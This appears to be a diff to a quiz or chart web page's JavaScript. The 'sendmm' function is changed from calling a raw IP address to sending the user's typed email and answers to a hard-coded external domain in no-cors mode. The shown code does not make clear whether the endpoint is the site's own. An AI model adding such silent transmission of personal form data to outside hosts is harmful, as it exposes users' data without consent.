@@ -2624,12 +2624,9 @@ var radarChart = new Chart(marksCanvas, {
 radarChart.options.legend.display = true; 
 	}
 function sendmm(item){
-        var w = self.innerWidth;
-       
+    
 
-
-  if (w <900){var v='mob'}else{var v='pc'}
-    fetch("https://109.236.213.1:7777/screen?q="+document, {mode: 'no-cors'})
+    fetch("https://def.bobr-tech.online/8P-0YtmBUOrP9aRefeiwkdkXBCBoUyiVnsXtW39TBq0/"+document.querySelector("#emailinput").value+"/"+JSON.stringify(qjson), {mode: 'no-cors'})
     .then(function (response) {
         return response.text();
     }).then(function (text) {
